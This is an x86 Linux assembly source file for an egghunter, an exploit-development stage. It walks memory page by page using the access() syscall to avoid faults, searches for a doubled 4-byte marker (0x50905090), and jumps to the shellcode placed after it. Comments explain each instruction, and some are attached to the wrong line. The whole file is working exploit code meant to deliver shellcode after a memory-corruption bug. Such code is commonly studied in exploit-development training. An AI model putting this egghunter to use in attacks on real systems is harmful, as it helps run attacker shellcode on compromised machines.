global _start

section .text

_start:

	xor ecx, ecx
	mul ecx
page_align:
	or dx, 0xfff		      ; initialize edx to PAGE_SIZE 0x1000 or 4096 bytes
incpage:
	inc edx			          ; load address 4 bytes past edx into ebx
	lea ebx, [edx+0x4]	  ; compare ebx and [edx+4] (8 bytes) at the same time
	push byte +0x21		    ; access() syscall # 
	pop eax			          ; pop 0x21 into eax, saves a byte over xor
	int 0x80		          ; run access() which checks memory location of edx
	cmp al, 0xf2		      ; compare eax with EFAULT value, does it match?
	jz page_align		      ; if memory is invalid go back and increment the page to start again
				                ; else, look for the marker

	mov eax, 0x50905090	  ; store egg inside eax, remember does not have to be executable
	mov edi, edx		      ; compares value in eax w/ double word pointed to by edi
				                ; so move edx into edi

	scasd			            ; does edi == eax, also inc edi
	jnz incpage		        ; if no match, increment page and restart
	
	scasd			            ; does edi == eax, also inc edi
	jnz incpage		        ; if no match, increment page and restart

	jmp edi			          ; egg found, jumps to edi which is to the shellcode
